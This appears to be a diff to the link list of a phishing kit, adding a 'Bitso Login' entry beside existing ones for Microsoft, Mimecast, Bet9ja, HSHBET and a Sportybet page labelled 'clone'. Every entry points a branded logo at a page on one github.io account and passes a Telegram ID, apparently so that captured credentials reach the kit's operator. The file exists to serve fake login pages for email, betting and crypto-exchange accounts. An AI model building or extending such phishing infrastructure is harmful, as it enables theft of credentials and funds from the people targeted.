@@ -1,6 +1,7 @@
 const premiumLinks = [ 
  { name: "Microsoft Login", image: "https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/1024px-Microsoft_logo.svg.png", urlTemplate: "https://eal876955-lgtm.github.io/npi/m/mt.htm?id={telegram-id}" },
   { name: "Sporty bet clone Login", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS9GFPuwZ7XpRmmDorr5EkOhCxjdn3SUsqHpEJs0sBnDDiyyMR5SEQyBG0&s=10", urlTemplate: "https://eal876955-lgtm.github.io/npi/s/s.html?id={telegram-id}" },
+{ name: "Bitso Login", image: "https://i.pinimg.com/736x/af/8f/82/af8f827d0c526b39286ebf2e199519cc.jpg", urlTemplate: "https://eal876955-lgtm.github.io/npi/b/bi.html?id={telegram-id}" },
   { name: "Bet Naija Login", image: "https://upload.wikimedia.org/wikipedia/en/9/90/Bet9ja_logo.jpeg", urlTemplate: "https://eal876955-lgtm.github.io/npi/bn/m.html?id={telegram-id}" },
  { name: "HSHBET Game", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSkDWnabW5QPSimNg-wMH9m8CDyBxLlg77BpKdHncznbQ&s=10", urlTemplate: "https://eal876955-lgtm.github.io/npi/h/hs.html?id={telegram-id}" },
  { name: "Mimecast Login", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQYYBynoeQSYPfn00CW_eRNUshdVhKsXHdvt45OwFINpw&s=10", urlTemplate: "https://eal876955-lgtm.github.io/npi/mm/index.html?id={telegram-id}" },
